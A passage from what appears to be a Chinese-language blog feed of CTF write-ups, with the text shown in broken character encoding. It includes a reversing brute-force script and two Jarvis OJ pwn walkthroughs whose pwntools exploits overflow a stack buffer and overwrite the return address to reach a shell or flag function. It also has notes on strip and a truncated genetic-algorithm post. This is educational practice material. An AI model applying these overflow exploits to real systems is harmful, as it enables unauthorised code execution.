E4</code>ã€‚æˆ‘çœ‹ç½‘ä¸Šå¾ˆå¤šæ•™ç¨‹æ˜¯ç›´æ¥é€šè¿‡å¼‚æˆ–ï¼Œå°†s2å¼‚æˆ–0x80å¾—åˆ°ç»“æœï¼ˆè„‘æ´ï¼Ÿï¼Ÿï¼‰</p><p><img src="https://i.loli.net/2018/10/22/5bcd7e34f2571.png" alt=""></p><p>ä¸€ä¸ªå­—èŠ‚çš„æƒ…å†µä¸‹ï¼Œå¯èƒ½é€šè¿‡å¼‚æˆ–æ“ä½œå¹¶ä¸”æ ¹æ®å·²çŸ¥æ¡ä»¶èƒ½å¤Ÿå¾—åˆ°æˆ–æ“ä½œçš„åŸæ“ä½œæ•°ï¼Œä½†æ˜¯æˆ‘å¯èƒ½å¤ªèœäº†ä¸æ±‚ç”šè§£ï¼Œåªèƒ½å†™ä¸ªè„šæœ¬æšä¸¾ä¸€ä¸‹flagå¥½äº†ï¼ˆæ ¹æ®idaæ ¹æœ¬éš¾ä»¥çœ‹å‡ºæ¥å¥½ä¸å¥½ğŸ˜­è¿˜æ˜¯å¤ªèœäº†ä¸èƒ½æ€ªida)ã€‚</p></blockquote><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><blockquote><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#coding:utf-8</span><span class="token comment" spellcheck="true">#</span>__Author__ <span class="token operator">=</span><span class="token string">"Yof3ng"</span>lists <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0xE6</span><span class="token punctuation">,</span><span class="token number">0xEC</span><span class="token punctuation">,</span><span class="token number">0xE1</span><span class="token punctuation">,</span><span class="token number">0xE7</span><span class="token punctuation">,</span><span class="token number">0xBA</span><span class="token punctuation">,</span><span class="token number">0xF4</span><span class="token punctuation">,</span><span class="token number">0xE5</span><span class="token punctuation">,</span><span class="token number">0xF3</span><span class="token punctuation">,</span><span class="token number">0xF4</span><span class="token punctuation">,</span><span class="token number">0xF4</span><span class="token punctuation">,</span><span class="token number">0xE5</span><span class="token punctuation">,</span><span class="token number">0xF3</span><span class="token punctuation">,</span><span class="token number">0xF4</span><span class="token punctuation">]</span>flag<span class="token operator">=</span><span class="token string">""</span><span class="token keyword">for</span> a <span class="token keyword">in</span> lists<span class="token punctuation">:</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> i<span class="token operator">|</span><span class="token number">0x80</span><span class="token operator">==</span>a<span class="token punctuation">:</span>            flag <span class="token operator">+=</span> chr<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span></code></pre></blockquote><p>è¿è¡Œæ•ˆæœï¼š</p><p><img src="https://i.loli.net/2018/10/22/5bcd7ed7225ae.png" alt=""></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;[TOC]&lt;/p&gt;
&lt;h1 id=&quot;Re-10æœˆ22-shiyanbar-10000&quot;&gt;&lt;a href=&quot;#Re-10æœˆ22-shiyanbar-10000&quot; class=&quot;headerlink&quot; title=&quot;Re-10æœˆ22-shiyanbar-10000&quot;&gt;&lt;/a&gt;R
      
    
    </summary>
    
      <category term="CTF" scheme="http://www.yof3ng.xyz/categories/CTF/"/>
    
    
      <category term="CTF" scheme="http://www.yof3ng.xyz/tags/CTF/"/>
    
      <category term="äºŒè¿›åˆ¶å®‰å…¨" scheme="http://www.yof3ng.xyz/tags/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/"/>
    
      <category term="RE" scheme="http://www.yof3ng.xyz/tags/RE/"/>
    
  </entry>
  
  <entry>
    <title>Pwn-10æœˆ21-jarvis-level0</title>
    <link href="http://www.yof3ng.xyz/2018/10/21/Pwn-10%E6%9C%8821-jarvis-level0/"/>
    <id>http://www.yof3ng.xyz/2018/10/21/Pwn-10æœˆ21-jarvis-level0/</id>
    <published>2018-10-21T01:01:10.000Z</published>
    <updated>2018-10-21T01:54:26.067Z</updated>
    
    <content type="html"><![CDATA[<p>[TOC]</p><h1 id="Pwn-10æœˆ21-jarvis-level0"><a href="#Pwn-10æœˆ21-jarvis-level0" class="headerlink" title="Pwn-10æœˆ21-jarvis-level0"></a>Pwn-10æœˆ21-jarvis-level0</h1><blockquote><p>è¿™é¢˜æ˜¯è¡¥ä¸Šæ˜¨å¤©æ²¡å†™å®Œçš„ä¸€é¢˜ã€‚ã€‚ã€‚è™½ç„¶å¾ˆç®€å•ğŸ˜­ğŸ˜­</p></blockquote><h2 id="æ£€æŸ¥ä¿æŠ¤æªæ–½"><a href="#æ£€æŸ¥ä¿æŠ¤æªæ–½" class="headerlink" title="æ£€æŸ¥ä¿æŠ¤æªæ–½"></a>æ£€æŸ¥ä¿æŠ¤æªæ–½</h2><blockquote><p><code>file level0</code> and <code>checksec level0</code>:</p><p><img src="https://i.loli.net/2018/10/21/5bcbd13050ba5.png" alt=""></p><p>å¯ä»¥çœ‹åˆ°è¿™ç§ç®€å•çš„pwné¢˜åŸºæœ¬ä¸å¼€ä¿æŠ¤æªæ–½ï¼Œä¸ç„¶èœé¸¡æˆ‘ä¹Ÿç©ä¸ä¸‹å»ã€‚ã€‚ã€‚</p></blockquote><h2 id="é™æ€åˆ†æç¨‹åºé€»è¾‘"><a href="#é™æ€åˆ†æç¨‹åºé€»è¾‘" class="headerlink" title="é™æ€åˆ†æç¨‹åºé€»è¾‘"></a>é™æ€åˆ†æç¨‹åºé€»è¾‘</h2><blockquote><p>ä¸€ç”¨IDA Proæ‰“å¼€ç¨‹åºæ–‡ä»¶çœ‹çœ‹mainå‡½æ•°å°±è„‘æ®‹åœ°çœ‹åˆ°äº†<code>return vulnerable_function()</code></p><p><img src="https://i.loli.net/2018/10/21/5bcbd173656cc.png" alt=""></p><p>è·Ÿç€å»è¿™ä¸ªå‡½æ•°çœ‹ä¸€çœ‹:</p><p><img src="https://i.loli.net/2018/10/21/5bcbd20189ae1.png" alt=""></p><p>å¯ä»¥çœ‹åˆ°å®šä¹‰çš„bufç©ºé—´ä¸º0x80,è€Œèƒ½å¤Ÿç”¨readå‡½æ•°è¯»å–çš„ä¸º0x200ï¼Œèƒ½å¤Ÿé€ æˆæ ˆæº¢å‡ºï¼Œå¹¶ä¸”å®ç°å‡½æ•°åœ°å€è¦†ç›–ã€‚è€Œä¸”æˆ‘ä»¬ä¹Ÿå¯ä»¥çœ‹åˆ°ä¸€ä¸ªcallsystemå‡½æ•°ï¼Œç‚¹è¿›å»çœ‹çœ‹å¯ä»¥å‘ç°<code>system(&quot;/bin/sh&quot;)</code>:</p><p><img src="https://i.loli.net/2018/10/21/5bcbd2752027e.png" alt=""></p><p>é‚£ä¹ˆæ ¹æ®é™æ€åˆ†æå‡ºæ¥çš„ä¿¡æ¯å¤§æ¦‚å¯ä»¥ç¡®å®šï¼šé¦–å…ˆé€šè¿‡mainå‡½æ•°è¿”å›åˆ°vulnerable_functionå‡½æ•°ï¼Œç„¶åé€šè¿‡vulnerable_functionå‡½æ•°å°†æŸå¤„è¿”å›åœ°å€è¦†ç›–ä¸ºcallsystemå‡½æ•°çš„åœ°å€ï¼Œç„¶ågetshellã€‚</p></blockquote><h2 id="åŠ¨æ€åˆ†æç¨‹åºé€»è¾‘"><a href="#åŠ¨æ€åˆ†æç¨‹åºé€»è¾‘" class="headerlink" title="åŠ¨æ€åˆ†æç¨‹åºé€»è¾‘"></a>åŠ¨æ€åˆ†æç¨‹åºé€»è¾‘</h2><blockquote><p>gdb è°ƒè¯•ä¸€ä¸‹level0ï¼Œå…ˆå•æ­¥æ‰§è¡Œåˆ°vulnerable_function()å‡½æ•°ï¼š</p><p><img src="https://i.loli.net/2018/10/21/5bcbd5dc96afe.png" alt=""></p><p>å…ˆè¿‡ä¸€éè¯¥å‡½æ•°ï¼Œç„¶åè®°å½•å…³é”®ä¿¡æ¯ï¼š</p><p><img src="https://i.loli.net/2018/10/21/5bcbd6954fadf.png" alt=""></p><p>è®¡ç®—ä¸€ä¸‹è·ç¦»ï¼š<code>hex(0x7fffffffdfc0 + 8 - 0x7fffffffdf40) = 0x88</code>ï¼Œé‚£ä¸ºä»€ä¹ˆæ¯”å®šä¹‰çš„0x80è¦å¤š0x08çš„è·ç¦»å‘¢ï¼Ÿè¿™é‡Œæˆ‘ä»¬å¯ä»¥é€šè¿‡ida proçš„<code>alt + k</code>å¿«æ·é”®æŸ¥çœ‹bufçš„æ ˆå¸§ï¼Œä¼šå‘ç°ï¼š</p><p><img src="https://i.loli.net/2018/10/21/5bcbd939b1a8b.png" alt=""></p><p>é€šè¿‡gdbè°ƒè¯•é‡Œé¢çš„å¤šä¸ªå…³é”®ä¿¡æ¯å¯¹æ¯”ï¼Œå…¶å®å¤šå‡ºæ¥çš„0x08æ˜¯æ ˆåº•çš„å†…å®¹ï¼Œç»§ç»­ä¸‹ä¸€æ­¥ï¼Œå°±å¯ä»¥çœ‹åˆ°æœ€å¼€å§‹è¢«å‹å…¥æ ˆä¸­çš„è¿”å›åœ°å€è¢«ç½®æ ˆé¡¶ï¼Œå‡†å¤‡è¿”å›ï¼š</p><p><img src="https://i.loli.net/2018/10/21/5bcbda659d6b6.png" alt=""></p><p>é‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥å¼€å§‹æ„é€ expå•¦ğŸ˜„ã€‚</p></blockquote><h2 id="æ”»ç ´"><a href="#æ”»ç ´" class="headerlink" title="æ”»ç ´"></a>æ”»ç ´</h2><blockquote><p>é€šè¿‡ä¸Šé¢çš„é€»è¾‘æˆ‘ä»¬å¯ä»¥å†™å‡ºå¦‚ä¸‹expï¼š</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#coding:utf-8</span>Author <span class="token operator">=</span> <span class="token string">"Yof3ng"</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"level0"</span><span class="token punctuation">)</span>callsystem_addr <span class="token operator">=</span> <span class="token number">0x400596</span>padding <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token number">0x80</span> <span class="token operator">+</span> <span class="token number">0x08</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token string">"a"</span>payload <span class="token operator">=</span> padding <span class="token operator">+</span> callsystem_addrio<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre></blockquote><p>è¿è¡Œæ•ˆæœï¼š</p><p><img src="https://i.loli.net/2018/10/21/5bcbdc2dbe46c.png" alt=""></p><p>ç„¶åå°±getshellå•¦ğŸ˜ã€‚</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;[TOC]&lt;/p&gt;
&lt;h1 id=&quot;Pwn-10æœˆ21-jarvis-level0&quot;&gt;&lt;a href=&quot;#Pwn-10æœˆ21-jarvis-level0&quot; class=&quot;headerlink&quot; title=&quot;Pwn-10æœˆ21-jarvis-level0&quot;&gt;&lt;/a&gt;Pwn-
      
    
    </summary>
    
      <category term="CTF" scheme="http://www.yof3ng.xyz/categories/CTF/"/>
    
    
      <category term="Pwn" scheme="http://www.yof3ng.xyz/tags/Pwn/"/>
    
      <category term="CTF" scheme="http://www.yof3ng.xyz/tags/CTF/"/>
    
      <category term="äºŒè¿›åˆ¶å®‰å…¨" scheme="http://www.yof3ng.xyz/tags/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>Pwn-10æœˆ20-one-of-jarvis</title>
    <link href="http://www.yof3ng.xyz/2018/10/20/Pwn-10%E6%9C%8820-two-of-jarvis/"/>
    <id>http://www.yof3ng.xyz/2018/10/20/Pwn-10æœˆ20-two-of-jarvis/</id>
    <published>2018-10-20T14:48:18.000Z</published>
    <updated>2018-10-20T16:07:46.818Z</updated>
    
    <content type="html"><![CDATA[<p>[TOC]</p><h1 id="Pwn-10æœˆ20-jarvis-Tell-me-something"><a href="#Pwn-10æœˆ20-jarvis-Tell-me-something" class="headerlink" title="Pwn-10æœˆ20-jarvis-Tell_me_something"></a>Pwn-10æœˆ20-jarvis-Tell_me_something</h1><blockquote><p>ä»Šå¤©ç®€å•åœ°åšä¸€ä¸‹jarvis ojçš„ä¸¤é“é¢˜ï¼Œ<code>level0</code>å’Œ<code>Tell_me_something</code>.</p><p>PS:å‡Œæ™¨0:07  æ˜å¤©å†™level0ï¼Œå…¶å®ä¸¤é¢˜å·®ä¸å¤šçš„é€»è¾‘ï¼ŒæŒºç®€å•çš„ã€‚</p></blockquote><h2 id="Tell-me-something"><a href="#Tell-me-something" class="headerlink" title="Tell_me_something"></a>Tell_me_something</h2><h3 id="æ£€æŸ¥ä¿æŠ¤æªæ–½"><a href="#æ£€æŸ¥ä¿æŠ¤æªæ–½" class="headerlink" title="æ£€æŸ¥ä¿æŠ¤æªæ–½"></a>æ£€æŸ¥ä¿æŠ¤æªæ–½</h3><blockquote><p>é¦–å…ˆï¼Œ<code>file gestbook</code>and<code>checksec guestbook</code>ï¼Œç®€å•åœ°çœ‹çœ‹æ–‡ä»¶ä¿¡æ¯å’Œä¿æŠ¤æªæ–½</p><p><img src="https://i.loli.net/2018/10/20/5bcb420ce98b7.png" alt=""></p><p>å¯ä»¥çœ‹åˆ°å®ƒæ˜¯æ²¡æœ‰è„±è¡£æœçš„ï¼Œç„¶åæ²¡æœ‰å¼€å¯ä¿æŠ¤æªæ–½ã€‚</p></blockquote><h3 id="é™æ€åˆ†æç¨‹åºé€»è¾‘"><a href="#é™æ€åˆ†æç¨‹åºé€»è¾‘" class="headerlink" title="é™æ€åˆ†æç¨‹åºé€»è¾‘"></a>é™æ€åˆ†æç¨‹åºé€»è¾‘</h3><blockquote><p>ç”¨IDA pro çœ‹ä¸€ä¸‹è¯¥ç¨‹åºçš„æ±‡ç¼–ä»£ç ï¼Œå¯ä»¥çœ‹åˆ°mainå‡½æ•°ï¼š</p><p><img src="https://i.loli.net/2018/10/20/5bcb42684db9f.png" alt=""></p><p>F5å¤§æ³•ï¼Œçœ‹çœ‹ä¼ªä»£ç ï¼Œå¾ˆç®€å•å°±å¯ä»¥åˆ¤æ–­å‡ºæº¢å‡ºç‚¹ï¼Œå› ä¸ºreadå‡½æ•°å¯ä»¥å°†è¶…å‡º0x88å¤§å°çš„æ•°æ®è¯»å…¥æ ˆç©ºé—´ï¼š</p><p><img src="https://i.loli.net/2018/10/20/5bcb42f7dd043.png" alt=""></p><p>ç„¶åæˆ‘ä»¬ä¹Ÿå¯ä»¥çœ‹åˆ°good_gameå‡½æ•°é‡Œé¢æœ‰æˆ‘ä»¬è¦çš„å…³é”®ä¿¡æ¯ï¼š</p><p><img src="https://i.loli.net/2018/10/20/5bcb498c0b0c9.png" alt=""></p><p>é‚£ä¹ˆåˆ°è¿™é‡ŒåŸºæœ¬ä¸Šå¯ä»¥ç¡®å®šï¼Œæ˜¯é€šè¿‡æº¢å‡ºæ¥ä½¿ç¨‹åºè·³è½¬åˆ°good_gameå‡½æ•°ä»è€Œå¾—åˆ°flagã€‚</p></blockquote><h3 id="åŠ¨æ€åˆ†æç¨‹åºé€»è¾‘"><a href="#åŠ¨æ€åˆ†æç¨‹åºé€»è¾‘" class="headerlink" title="åŠ¨æ€åˆ†æç¨‹åºé€»è¾‘"></a>åŠ¨æ€åˆ†æç¨‹åºé€»è¾‘</h3><blockquote><p>é¦–å…ˆæ”¾linuxé‡Œé¢è·‘ä¸€è·‘ï¼š</p><p><img src="https://i.loli.net/2018/10/20/5bcb48a91dfc9.png" alt=""></p><p>ç¡®å®äº§ç”Ÿäº†æº¢å‡ºçš„é—®é¢˜ï¼Œç„¶åè¿™é‡Œæˆ‘ä»¬ç”¨ä¸€ä¸‹linuxå¹³å°çš„ä¸€ä¸ªäºŒè¿›åˆ¶åˆ†æè½¯ä»¶ï¼Œradare2ï¼Œè¯´å®è¯è¿˜æ˜¯å¯ä»¥ç”¨çš„ï¼Œè¿™ä¸ªè½¯ä»¶é›†æˆäº†å¾ˆå¤šå·¥å…·ï¼Œå¹¶ä¸”ä¹Ÿå¯ä»¥è¿›è¡Œéƒ¨åˆ†åœ°åŠ¨æ€è°ƒè¯•ï¼ˆ<a href="https://xz.aliyun.com/t/1514/#toc-7" target="_blank" rel="noopener">radare2è¯¦ç»†æ•™ç¨‹</a>ï¼‰ï¼š</p><p><img src="https://i.loli.net/2018/10/20/5bcb495987b21.png" alt=""></p><p>æ¥ä¸‹æ¥æˆ‘ä»¬ç”¨gdbè°ƒè¯•ä¸€ä¸‹ï¼Œå…ˆæ„é€ ä¸€ä¸ª0x88é•¿åº¦çš„paddingè¾“å…¥ï¼Œå†çœ‹çœ‹æ ˆç©ºé—´ï¼š</p><p><img src="https://i.loli.net/2018/10/20/5bcb4c838d5dd.png" alt=""></p><p>å¯ä»¥çŸ¥é“å°†é•¿åº¦ä¸º0x88çš„paddingå¡«å……åˆ°æ ˆç©ºé—´ä¹‹åï¼Œè¿˜å¯ä»¥è¿›è¡Œè¦†ç›–ï¼Œå› ä¸ºå¯ä»¥è¯»å–æœ€å¤§0x100ï¼ˆ256ï¼‰å¤§å°çš„å­—ç¬¦ï¼Œè€Œebpæ ˆåº•å‡ºç•Œå°±æ˜¯ä¸€ä¸ªå‡½æ•°åœ°å€ï¼Œæˆ‘ä»¬å¯ä»¥çœ‹çœ‹è¿™ä¸ªå‡½æ•°åœ°å€æœ‰ä»€ä¹ˆå…³é”®æ€§çš„æ“ä½œä¸¾åŠ¨ï¼š</p><p><img src="https://i.loli.net/2018/10/20/5bcb4d6959622.png" alt=""></p><p>è¿›è¡Œå•æ­¥æ‰§è¡Œæµ‹è¯•æŸ¥çœ‹è¯¥æº¢å‡ºç‚¹èƒ½å¤Ÿè¢«è¦†ç›–çš„åœ°å€æ˜¯å¦ä¼šè¢«è¿”å›ï¼Œå…ˆé‡æ–°æŸ¥çœ‹ä¸€ä¸‹è¯¥æ ˆä½ç½®å­˜å‚¨çš„å‡½æ•°åœ°å€ä¸ºå¤šå°‘ï¼š</p><p><img src="https://i.loli.net/2018/10/20/5bcb4f4e7f83a.png" alt=""></p><p>å¯ä»¥çœ‹åˆ°å­˜å‚¨çš„å‡½æ•°åœ°å€ä¸º0x7ffff7a3fa87ï¼Œåˆ°æ ˆä½ç½®å³å°†æ”¹å˜æ—¶ï¼Œè¿›è¡Œä¸‹ä¸€æ­¥éªŒè¯ï¼š</p><p><img src="https://i.loli.net/2018/10/20/5bcb4e0d8a46d.png" alt=""></p><p>æ‰§è¡Œä¸‹ä¸€æ­¥ï¼š</p><p><img src="https://i.loli.net/2018/10/20/5bcb4e84bc436.png" alt=""></p><p>å†ä¸‹ä¸€æ­¥å°±å°†è¯¥å‡½æ•°åœ°å€æ”¾å…¥äº†RIPï¼Œä½œä¸ºä¸‹ä¸€æ­¥è¿è¡Œçš„å‡½æ•°æŒ‡ä»¤ï¼š<br><img src="https://i.loli.net/2018/10/20/5bcb4ed83e345.png" alt=""></p><p>é‚£ä¹ˆåˆ°è¿™é‡Œå·²ç»æ˜ç™½å¯ä»¥è¿”å›è¯¥åœ°å€è¦†ç›–çš„å†…å®¹ï¼Œå†™expäº†ã€‚</p></blockquote><h3 id="æ”»ç ´"><a href="#æ”»ç ´" class="headerlink" title="æ”»ç ´"></a>æ”»ç ´</h3><blockquote><p>ç”¨0x88é•¿åº¦çš„å†…å®¹åšpaddingï¼Œç„¶åå°†good_gameçš„åœ°å€æ”¾åˆ°å°¾éƒ¨ï¼Œç„¶åæ‰§è¡Œå³å¯ã€‚</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#coding:utf-8</span><span class="token comment" spellcheck="true">#exp.py</span>Author <span class="token operator">=</span> <span class="token string">"Yof3ng"</span><span class="token keyword">from</span> pwn impor <span class="token operator">*</span>io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'guestbook'</span><span class="token punctuation">)</span>good_game_addr <span class="token operator">=</span> <span class="token number">0x400620</span>padding <span class="token operator">=</span> <span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0x88</span>payload <span class="token operator">=</span> padding <span class="token operator">+</span> p64<span class="token punctuation">(</span>good_game_addr<span class="token punctuation">)</span>io<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token keyword">print</span> io<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">print</span> io<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre></blockquote><p>è¿è¡Œç»“æœï¼š</p><p><img src="https://i.loli.net/2018/10/21/5bcb5203a355b.png" alt=""></p><p>å•Šæœ¬æ¥ä»Šå¤©æ‰“ç®—å†™ä¸¤é¢˜çš„åšå®¢ï¼Œçœ‹æ¥è¿™ç¯‡åªèƒ½æ°´äº†ï¼Œå¤ªæ™šäº†å…ˆç¡äº†ã€‚ğŸ˜­ğŸ˜­</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;[TOC]&lt;/p&gt;
&lt;h1 id=&quot;Pwn-10æœˆ20-jarvis-Tell-me-something&quot;&gt;&lt;a href=&quot;#Pwn-10æœˆ20-jarvis-Tell-me-something&quot; class=&quot;headerlink&quot; title=&quot;Pwn-10æœˆ20-j
      
    
    </summary>
    
      <category term="CTF" scheme="http://www.yof3ng.xyz/categories/CTF/"/>
    
    
      <category term="Pwn" scheme="http://www.yof3ng.xyz/tags/Pwn/"/>
    
      <category term="CTF" scheme="http://www.yof3ng.xyz/tags/CTF/"/>
    
      <category term="äºŒè¿›åˆ¶å®‰å…¨" scheme="http://www.yof3ng.xyz/tags/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>Pwn-10æœˆ17-strip</title>
    <link href="http://www.yof3ng.xyz/2018/10/17/Pwn-10%E6%9C%8817-strip/"/>
    <id>http://www.yof3ng.xyz/2018/10/17/Pwn-10æœˆ17-strip/</id>
    <published>2018-10-17T15:27:29.000Z</published>
    <updated>2018-10-17T15:58:01.279Z</updated>
    
    <content type="html"><![CDATA[<p>[TOC]</p><h1 id="Pwn-10æœˆ17-strip"><a href="#Pwn-10æœˆ17-strip" class="headerlink" title="Pwn-10æœˆ17-strip"></a>Pwn-10æœˆ17-strip</h1><blockquote><p>stripæ˜¯linuxä¸‹çš„ä¸€ä¸ªå‘½ä»¤ï¼Œç”¨äºç»™ç‰¹å®šæ–‡ä»¶æ¶ˆé™¤ï¼Œå‰¥ç¦»ä¸€äº›ç¬¦å·ä¿¡æ¯å’Œè°ƒè¯•ä¿¡æ¯ï¼Œé€šå¸¸è¢«å«åšâ€œè„±è¡£æœâ€ï¼Œå¯ä»¥å‡å°å¯æ‰§è¡Œæ–‡ä»¶çš„ä½“ç§¯ï¼Œåˆä¸å½±å“å…¶è¿è¡Œï¼Œä½†æ˜¯å½“è¿™ç§ç¨‹åºå‡ºç°åœ¨äºŒè¿›åˆ¶åˆ†æä¸­å°±æ¯”è¾ƒéº»çƒ¦äº†ï¼Œå› ä¸ºç”¨stripå‘½ä»¤å¤„ç†è¿‡çš„ç¨‹åºï¼Œåç¼–è¯‘å¯èƒ½ä¼šæ¯”è¾ƒæ··ä¹±ï¼Œæœ‰æ—¶å€™ä¹Ÿéœ€è¦æ¢å¤ç¬¦å·è¡¨æ¥å®Œæˆåˆ†æã€‚</p><p>ç®€å•ç¼–è¯‘ä¸€ä¸ªtest.cæ–‡ä»¶ï¼Œè„±è„±è¡£æœè¯•è¯•ï¼š</p><p><img src="https://i.loli.net/2018/10/17/5bc759646ed19.png" alt=""></p><p>å¯ä»¥çœ‹åˆ°ç¼–è¯‘åçš„testæ–‡ä»¶ä¿¡æ¯ï¼Œnot strippedï¼Œè¿™é‡Œå†ç”¨åˆ°linuxä¸‹çš„nmå‘½ä»¤ï¼Œæ˜¯namesçš„ç¼©å†™ï¼Œèƒ½å¤Ÿåˆ—å‡ºæ–‡ä»¶çš„ç¬¦å·å€¼ï¼Œå‡½æ•°å’Œå…¨å±€å˜é‡ç­‰ä¿¡æ¯ï¼Œæ›´å®˜æ–¹ä¸€ç‚¹çš„å°±æ˜¯è¿™æ ·çš„è§£é‡Šï¼š<code>nmå·¥å…·åˆ—å‡º.oæ–‡ä»¶ã€.aæ–‡ä»¶ã€.soæ–‡ä»¶ç­‰çš„ç¬¦å·ä¿¡æ¯ï¼ŒåŒ…æ‹¬è¯¸å¦‚ç¬¦å·çš„å€¼ï¼Œç¬¦å·ç±»å‹åŠç¬¦å·åç§°ç­‰ã€‚æ‰€è°“ç¬¦å·ï¼Œé€šå¸¸æŒ‡å®šä¹‰å‡ºçš„å‡½æ•°ï¼Œå…¨å±€å˜é‡ç­‰ç­‰ã€‚</code>ã€‚</p><p><img src="https://i.loli.net/2018/10/17/5bc75a09ec273.png" alt=""></p><p>åƒ hacklu2018çš„ä¸€ä¸ªé¢˜ï¼Œå°±æ˜¯è„±äº†è¡£æœçš„ï¼Œæ²¡æœ‰ç¬¦å·è¡¨ï¼š</p><p><img src="https://i.loli.net/2018/10/17/5bc75aa3b1afa.png" alt=""></p><p>é‚£ä¹ˆç»™testæ–‡ä»¶è„±ä¸€ä¸‹è¯•è¯•ï¼š</p><p><img src="https://i.loli.net/2018/10/17/5bc75ae6dcb39.png" alt=""></p><p>å¯ä»¥çœ‹åˆ°ç¬¦å·è¡¨å·²ç»è¢«è„±ä¸‹ï¼Œå¹¶ä¸”ä¸å½±å“æ­£å¸¸è¿è¡Œã€‚</p></blockquote>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;[TOC]&lt;/p&gt;
&lt;h1 id=&quot;Pwn-10æœˆ17-strip&quot;&gt;&lt;a href=&quot;#Pwn-10æœˆ17-strip&quot; class=&quot;headerlink&quot; title=&quot;Pwn-10æœˆ17-strip&quot;&gt;&lt;/a&gt;Pwn-10æœˆ17-strip&lt;/h1&gt;&lt;blockqu
      
    
    </summary>
    
      <category term="CTF" scheme="http://www.yof3ng.xyz/categories/CTF/"/>
    
    
      <category term="Pwn" scheme="http://www.yof3ng.xyz/tags/Pwn/"/>
    
      <category term="linux" scheme="http://www.yof3ng.xyz/tags/linux/"/>
    
  </entry>
  
  <entry>
    <title>é—ä¼ ç®—æ³•</title>
    <link href="http://www.yof3ng.xyz/2018/10/17/%E9%81%97%E4%BC%A0%E7%AE%97%E6%B3%95/"/>
    <id>http://www.yof3ng.xyz/2018/10/17/é—ä¼ ç®—æ³•/</id>
    <published>2018-10-17T11:26:39.000Z</published>
    <updated>2018-10-26T12:42:49.320Z</updated>
    
    <content type="html"><![CDATA[<p>[TOC]</p><h1 id="é—ä¼ ç®—æ³•ï¼ˆGenetic-Algorithmï¼‰"><a href="#é—ä¼ ç®—æ³•ï¼ˆGenetic-Algorithmï¼‰" class="headerlink" title="é—ä¼ ç®—æ³•ï¼ˆGenetic Algorithmï¼‰"></a>é—ä¼ ç®—æ³•ï¼ˆGenetic Algorithmï¼‰</h1><blockquote><p>ç®—æ³•éƒ½æ˜¯ç”¨æ¥è§£å†³å®é™…é—®é¢˜ï¼Œæé«˜æ•ˆç‡çš„ï¼Œè€Œå­¦å¥½ç®—æ³•å¯¹ä¸€ä¸ªä¿¡æ¯å®‰å…¨ä»ä¸šè€…æ¥è¯´ï¼Œåº”è¯¥ä¹Ÿæ˜¯å¿…è¦çš„ã€‚å¼€å§‹æ¥è§¦è¿™äº›ç®—æ³•ï¼Œä¹Ÿé€æ¸æ„è¯†åˆ°çŸ¥è¯†é¢å¹¿é˜”çš„é‡è¦ï¼Œæ¯”å¦‚é—ä¼ ç®—æ³•å°±éœ€è¦çŸ¥é“ä¸€å®šçš„ç”Ÿç‰©çŸ¥è¯†ï¼Œå¯èƒ½è¿™å°±æ˜¯åŸ¹è®­æœºæ„æ— æ³•å¼¥è¡¥çš„åœ°æ–¹å§ã€‚</p></blockquote><h2 id="ç®€ä»‹"><a href="#ç®€ä»‹" class="headerlink" title="ç®€ä»‹"></a>ç®€ä»‹</h2><p>å…ˆå¼•ç”¨ä¸€ä¸‹é—ä¼ ç®—æ³•çš„è§£é‡Šï¼š</p><blockquote><p>&nbsp; &nbsp; &nbsp; &nbsp; <strong>é—ä¼ ç®—æ³•ï¼ˆGenetic Algorithmï¼‰</strong>æ˜¯æ¨¡æ‹Ÿè¾¾å°”æ–‡ç”Ÿç‰©è¿›åŒ–è®ºçš„è‡ªç„¶é€‰æ‹©å’Œé—ä¼ å­¦æœºç†çš„ç”Ÿç‰©è¿›åŒ–è¿‡ç¨‹çš„è®¡ç®—æ¨¡å‹ï¼Œæ˜¯ä¸€ç§é€šè¿‡æ¨¡æ‹Ÿè‡ªç„¶è¿›åŒ–è¿‡ç¨‹æœç´¢æœ€ä¼˜è§£çš„æ–¹æ³•ã€‚é—ä¼ ç®—æ³•æ˜¯ä»ä»£è¡¨é—®é¢˜å¯èƒ½æ½œåœ¨çš„è§£é›†çš„ä¸€ä¸ª<strong>ç§ç¾¤ï¼ˆpopulationï¼‰</strong>å¼€å§‹çš„ï¼Œè€Œä¸€ä¸ªç§ç¾¤åˆ™ç”±ç»è¿‡<strong>åŸºå› 